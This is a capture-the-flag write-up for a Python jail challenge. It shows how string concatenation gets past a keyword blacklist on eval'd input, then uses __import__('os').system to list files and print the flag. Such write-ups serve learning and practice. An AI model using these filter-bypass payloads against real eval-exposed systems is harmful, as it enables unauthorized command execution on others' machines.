# Challenge Solution

This challenge is a classic python jail.

Pretty much the first steps in every challenge of this kind is to find out what we are and aren't allowed to do.

Let's try get it to print the number 1.

```python
>> print(1)
bad bad!
```

Well, looks like it doesn't like us printing stuff. Maybe print is a filtered word?

Let's see what happens if we don't try and call a function. Let's just give it the number 1.

```python
>> 1
eval() arg 1 must be a string, bytes or code object
```

Okay, so looks like our input is being evaled. Let's try give it a string to eval. Let's try print again, but with a little bit of a filter bypass.

```python
>> 'pri'+'nt(1)'
1
```

Okay, now we're getting somewhere. Looks like the filter is just a blacklist of words to look for in our input.

Let's try import os and see if we can execute a command.
We use `__import__("os")` instead of `import os` so we can chain everything together in one command.
The strings are concatenated together in order to avoid any potential blacklisting.

```python
>> 'pri'+'nt(__im'+'port__("os").syst'+'em("ls"))'
flag.txt
jail.py
python3
0
```

Awesome! Let's print the flag.


```python
>> 'pri'+'nt(__im'+'port__("os").syst'+'em("cat fl"+"ag.txt"))'
HACKMAC{1m_50_50rry_17_w1ll_n3v3r_h4pp3n_4g41n}
0
```
